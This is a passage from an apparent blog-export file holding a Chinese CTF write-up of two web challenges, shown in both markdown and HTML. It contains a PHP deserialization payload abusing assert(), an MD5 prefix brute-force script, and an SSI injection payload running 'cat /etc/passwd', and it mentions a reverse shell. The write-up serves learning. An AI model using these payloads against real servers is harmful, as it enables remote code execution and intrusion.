serialize($s);\n\n```\n\nPOST请求\n\n```\ntime.php?data=O:8:\"HelloPhp\":2:{s:1:\"a\";s:9:\"phpinfo()\";s:1:\"b\";s:6:\"assert\";}\n```\n\n页面查找flag，在environment中找到flag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175822.png)\n\n# EasySearch\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420171541.png)\n\n进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到`index.php.swp`文件：\n\n```php\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n登陆功能又一个验证，需要传入的`passwd`参数使用**md5**加密以后是以**6d0bc1**开头的。简单写个脚本跑一下就有了：\n\n```python\n# codeing=utf-8\nimport hashlib\n\ncnt=1;\nwhile True:\n    md=hashlib.md5(str(cnt).encode(\"utf8\")).hexdigest()\n    if md.startswith(\"6d0bc1\"):\n        print(cnt)\n    cnt+=1\n#2020666\n#2305004\n```\n\n分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210417102904.png)\n\n看了看文件后缀是一格没有见过的：`shtml`，然后学到到了shtml有一种漏洞：[SSI注入漏洞](https://blog.csdn.net/qq_40657585/article/details/84260844)\n\n> SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\n简单的命令执行\n\n```code\n\"-->'-->`--><<!--#exec cmd=\"cat /etc/passwd\"-->\n```\n\n我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为`flag_990c66bf85a09c664f0b6741840499b2`的文件，获得flag","slug":"ReadlezPHP&EasySearch","published":1,"updated":"2021-12-30T09:42:54.196Z","_id":"ckrr3f9ar000ehotchd4w30nx","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"ReadlezPHP\"><a href=\"#ReadlezPHP\" class=\"headerlink\" title=\"ReadlezPHP\"></a>ReadlezPHP</h1><p>源码找到<code>time.php?source</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175641.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">#error_reporting(0);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloPhp</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$b</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;a = <span class=\"string\">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;b = <span class=\"string\">&quot;date&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$a</span> = <span class=\"keyword\">$this</span>-&gt;a;</span><br><span class=\"line\">        <span class=\"variable\">$b</span> = <span class=\"keyword\">$this</span>-&gt;b;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"keyword\">new</span> HelloPhp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;source&#x27;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$ppp</span> = unserialize(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在<code>HelloPhp</code>中有一个<code>__destruct</code>方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如<code>$a($b)</code>格式进行函数调用，假如变量<code>a</code>为字符串<code>var_dump</code>，<code>b</code>是任意字符串，就相当于调用var_dump函数且参数为b。</p>\n<p>所以构造反序列化，调用assert函数执行phpinfo。如果向<strong>assert()</strong> 函数传递字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行)：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class HelloPhp</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $a=&#x27;phpinfo()&#x27;;</span><br><span class=\"line\">    public $b=&#x27;assert&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$s=new HelloPhp();</span><br><span class=\"line\">echo serialize($s);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>POST请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>页面查找flag，在environment中找到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175822.png\"></p>\n<h1 id=\"EasySearch\"><a href=\"#EasySearch\" class=\"headerlink\" title=\"EasySearch\"></a>EasySearch</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420171541.png\"></p>\n<p>进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到<code>index.php.swp</code>文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tob_start();</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_hash</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$chars</span> = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$random</span> = <span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)];<span class=\"comment\">//Random 5 times</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$content</span> = uniqid().<span class=\"variable\">$random</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> sha1(<span class=\"variable\">$content</span>); </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    header(<span class=\"string\">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\">\t***</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"variable\">$admin</span> = <span class=\"string\">&#x27;6d0bc1&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( <span class=\"variable\">$admin</span> == substr(md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]),<span class=\"number\">0</span>,<span class=\"number\">6</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable\">$file_shtml</span> = <span class=\"string\">&quot;public/&quot;</span>.get_hash().<span class=\"string\">&quot;.shtml&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable\">$shtml</span> = fopen(<span class=\"variable\">$file_shtml</span>, <span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Unable to open file!&quot;</span>);</span><br><span class=\"line\">            <span class=\"variable\">$text</span> = <span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h1&gt;Hello,&#x27;</span>.<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>].<span class=\"string\">&#x27;&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t***&#x27;</span>;</span><br><span class=\"line\">            fwrite(<span class=\"variable\">$shtml</span>,<span class=\"variable\">$text</span>);</span><br><span class=\"line\">            fclose(<span class=\"variable\">$shtml</span>);</span><br><span class=\"line\">            ***</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;[!] Header  error ...&quot;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t***</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t***</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>登陆功能又一个验证，需要传入的<code>passwd</code>参数使用<strong>md5</strong>加密以后是以<strong>6d0bc1</strong>开头的。简单写个脚本跑一下就有了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># codeing=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">cnt=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    md=hashlib.md5(<span class=\"built_in\">str</span>(cnt).encode(<span class=\"string\">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> md.startswith(<span class=\"string\">&quot;6d0bc1&quot;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(cnt)</span><br><span class=\"line\">    cnt+=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"comment\">#2020666</span></span><br><span class=\"line\"><span class=\"comment\">#2305004</span></span><br></pre></td></tr></table></figure>\n\n<p>分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210417102904.png\"></p>\n<p>看了看文件后缀是一格没有见过的：<code>shtml</code>，然后学到到了shtml有一种漏洞：<a href=\"https://blog.csdn.net/qq_40657585/article/details/84260844\">SSI注入漏洞</a></p>\n<blockquote>\n<p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p>\n</blockquote>\n<p>简单的命令执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;--&gt;&#x27;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为<code>flag_990c66bf85a09c664f0b6741840499b2</code>的文件，获得flag</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"ReadlezPHP\"><a href=\"#ReadlezPHP\" class=\"headerlink\" title=\"ReadlezPHP\"></a>ReadlezPHP</h1><p>源码找到<code>time.php?source</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175641.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">#error_reporting(0);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HelloPhp</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$b</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;a = <span class=\"string\">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;b = <span class=\"string\">&quot;date&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$a</span> = <span class=\"keyword\">$this</span>-&gt;a;</span><br><span class=\"line\">        <span class=\"variable\">$b</span> = <span class=\"keyword\">$this</span>-&gt;b;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$b</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"keyword\">new</span> HelloPhp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;source&#x27;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$ppp</span> = unserialize(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在<code>HelloPhp</code>中有一个<code>__destruct</code>方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如<code>$a($b)</code>格式进行函数调用，假如变量<code>a</code>为字符串<code>var_dump</code>，<code>b</code>是任意字符串，就相当于调用var_dump函数且参数为b。</p>\n<p>所以构造反序列化，调用assert函数执行phpinfo。如果向<strong>assert()</strong> 函数传递字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行)：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class HelloPhp</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $a=&#x27;phpinfo()&#x27;;</span><br><span class=\"line\">    public $b=&#x27;assert&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$s=new HelloPhp();</span><br><span class=\"line\">echo serialize($s);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>POST请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>页面查找flag，在environment中找到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175822.png\"></p>\n<h1 id=\"EasySearch\"><a href=\"#EasySearch\" class=\"headerlink\" title=\"EasySearch\"></a>EasySearch</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420171541.png\"></p>\n<p>进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到<code>index.php.swp</code>文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tob_start();</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_hash</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$chars</span> = <span class=\"string\">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$random</span> = <span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)].<span class=\"variable\">$chars</span>[mt_rand(<span class=\"number\">0</span>,<span class=\"number\">73</span>)];<span class=\"comment\">//Random 5 times</span></span><br><span class=\"line\">\t\t<span class=\"variable\">$content</span> = uniqid().<span class=\"variable\">$random</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> sha1(<span class=\"variable\">$content</span>); </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    header(<span class=\"string\">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\">\t***</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) <span class=\"keyword\">and</span> <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>] != <span class=\"string\">&#x27;&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"variable\">$admin</span> = <span class=\"string\">&#x27;6d0bc1&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( <span class=\"variable\">$admin</span> == substr(md5(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]),<span class=\"number\">0</span>,<span class=\"number\">6</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable\">$file_shtml</span> = <span class=\"string\">&quot;public/&quot;</span>.get_hash().<span class=\"string\">&quot;.shtml&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable\">$shtml</span> = fopen(<span class=\"variable\">$file_shtml</span>, <span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Unable to open file!&quot;</span>);</span><br><span class=\"line\">            <span class=\"variable\">$text</span> = <span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h1&gt;Hello,&#x27;</span>.<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>].<span class=\"string\">&#x27;&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">            ***</span></span><br><span class=\"line\"><span class=\"string\">\t\t\t***&#x27;</span>;</span><br><span class=\"line\">            fwrite(<span class=\"variable\">$shtml</span>,<span class=\"variable\">$text</span>);</span><br><span class=\"line\">            fclose(<span class=\"variable\">$shtml</span>);</span><br><span class=\"line\">            ***</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;[!] Header  error ...&quot;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t***</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t***</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>登陆功能又一个验证，需要传入的<code>passwd</code>参数使用<strong>md5</strong>加密以后是以<strong>6d0bc1</strong>开头的。简单写个脚本跑一下就有了：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># codeing=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">cnt=<span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    md=hashlib.md5(<span class=\"built_in\">str</span>(cnt).encode(<span class=\"string\">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> md.startswith(<span class=\"string\">&quot;6d0bc1&quot;</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(cnt)</span><br><span class=\"line\">    cnt+=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"comment\">#2020666</span></span><br><span class=\"line\"><span class=\"comment\">#2305004</span></span><br></pre></td></tr></table></figure>\n\n<p>分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。</p>\n<p><img 